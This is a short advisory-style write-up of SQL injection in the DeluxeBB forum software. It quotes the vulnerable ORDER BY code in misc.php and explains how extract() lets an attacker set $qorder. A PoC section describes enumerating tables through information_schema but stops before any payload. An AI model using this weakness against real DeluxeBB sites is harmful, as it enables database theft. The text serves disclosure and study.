# Vuln description:
# DeluxeBB suffers many SQL Injections. They are caused, in part, by the extract() function
# used in header.php. I think this is a very bad practice. Attacker doesn't need
# register_globals turned On, and in this case that i'm showing you magic_quotes
# turned Off too.

# file: misc.php    lines: 461-464

	if($order == "name") { $qorder = "ORDER BY username"; }
	if($order == "regdate") { $qorder = "ORDER BY joineddate"; }
	if($order == "posts") { $qorder = "ORDER BY posts"; }
	if($order == "lastpost") { $qorder = "ORDER BY lastpost"; }

# This sequence of if does not provide an else..

	$getsel = $db->query("SELECT * FROM ".$prefix."users ".$qfilter." ".$qorder."  <==
		             ".$sort." LIMIT ".$pageinfo[0].",".$pageinfo[1]);

# An attacker can set an arbitrary value to the var $qorder if $order
# has a value not expected.

# PoC:
# I reccomend to use first of all this SQL Injection to retrieve all table's name
# of the database thanks to informatin_schema. You can use it to retrieve the table prefix
# of the CMS.
